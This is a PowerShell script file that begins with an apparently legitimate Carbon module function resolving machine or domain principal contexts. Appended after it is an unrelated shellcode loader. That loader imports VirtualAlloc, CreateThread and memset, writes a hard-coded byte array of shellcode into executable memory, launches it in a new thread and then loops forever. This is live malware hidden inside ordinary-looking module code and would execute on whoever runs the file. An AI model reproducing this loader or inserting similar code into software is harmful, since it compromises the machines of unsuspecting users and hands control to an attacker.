
function Get-IdentityPrincipalContext
{
    
    [CmdletBinding()]
    [OutputType([DirectoryServices.AccountManagement.PrincipalContext])]
    param(
        [Parameter(Mandatory=$true)]
        [Carbon.Identity]
        
        $Identity
    )

    Set-StrictMode -Version 'Latest'
    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    
    $machineCtx = New-Object 'DirectoryServices.AccountManagement.PrincipalContext' 'Machine',$env:COMPUTERNAME
    if( [DirectoryServices.AccountManagement.Principal]::FindByIdentity( $machineCtx, 'Sid', $Identity.Sid.Value ) )
    {
        return $machineCtx
    }

    $domainCtx = New-Object 'DirectoryServices.AccountManagement.PrincipalContext' 'Domain',$Identity.Domain
    if( [DirectoryServices.AccountManagement.PRincipal]::FindByIdentity( $domainCtx, 'Sid', $Identity.Sid.Value ) )
    {
        return $domainCtx
    }

    Write-Error -Message ('Unable to determine if principal ''{0}'' (SID: {1}; Type: {2}) is a machien or domain principal.' -f $Identity.FullName,$Identity.Sid.Value,$Identity.Type)
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x47,0x9f,0x77,0x55,0xd9,0xc0,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x70,0x13,0x83,0xc0,0x04,0x03,0x70,0x48,0x7d,0x82,0xa9,0xbe,0x03,0x6d,0x52,0x3e,0x64,0xe7,0xb7,0x0f,0xa4,0x93,0xbc,0x3f,0x14,0xd7,0x91,0xb3,0xdf,0xb5,0x01,0x40,0xad,0x11,0x25,0xe1,0x18,0x44,0x08,0xf2,0x31,0xb4,0x0b,0x70,0x48,0xe9,0xeb,0x49,0x83,0xfc,0xea,0x8e,0xfe,0x0d,0xbe,0x47,0x74,0xa3,0x2f,0xec,0xc0,0x78,0xdb,0xbe,0xc5,0xf8,0x38,0x76,0xe7,0x29,0xef,0x0d,0xbe,0xe9,0x11,0xc2,0xca,0xa3,0x09,0x07,0xf6,0x7a,0xa1,0xf3,0x8c,0x7c,0x63,0xca,0x6d,0xd2,0x4a,0xe3,0x9f,0x2a,0x8a,0xc3,0x7f,0x59,0xe2,0x30,0xfd,0x5a,0x31,0x4b,0xd9,0xef,0xa2,0xeb,0xaa,0x48,0x0f,0x0a,0x7e,0x0e,0xc4,0x00,0xcb,0x44,0x82,0x04,0xca,0x89,0xb8,0x30,0x47,0x2c,0x6f,0xb1,0x13,0x0b,0xab,0x9a,0xc0,0x32,0xea,0x46,0xa6,0x4b,0xec,0x29,0x17,0xee,0x66,0xc7,0x4c,0x83,0x24,0x8f,0xa1,0xae,0xd6,0x4f,0xae,0xb9,0xa5,0x7d,0x71,0x12,0x22,0xcd,0xfa,0xbc,0xb5,0x32,0xd1,0x79,0x29,0xcd,0xda,0x79,0x63,0x09,0x8e,0x29,0x1b,0xb8,0xaf,0xa1,0xdb,0x45,0x7a,0x5f,0xd9,0xd1,0xa8,0x97,0xe0,0x84,0xdb,0xd5,0xe2,0xc7,0xa0,0x53,0x04,0x97,0x86,0x33,0x99,0x57,0x77,0xf4,0x49,0x3f,0x9d,0xfb,0xb6,0x5f,0x9e,0xd1,0xde,0xf5,0x71,0x8c,0xb7,0x61,0xeb,0x95,0x4c,0x10,0xf4,0x03,0x29,0x12,0x7e,0xa0,0xcd,0xdc,0x77,0xcd,0xdd,0x88,0x77,0x98,0xbc,0x1e,0x87,0x36,0xaa,0x9e,0x1d,0xbd,0x7d,0xc9,0x89,0xbf,0x58,0x3d,0x16,0x3f,0x8f,0x36,0x9f,0xd5,0x70,0x20,0xe0,0x39,0x71,0xb0,0xb6,0x53,0x71,0xd8,0x6e,0x00,0x22,0xfd,0x70,0x9d,0x56,0xae,0xe4,0x1e,0x0f,0x03,0xae,0x76,0xad,0x7a,0x98,0xd8,0x4e,0xa9,0x18,0x24,0x99,0x97,0x6e,0x44,0x19;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
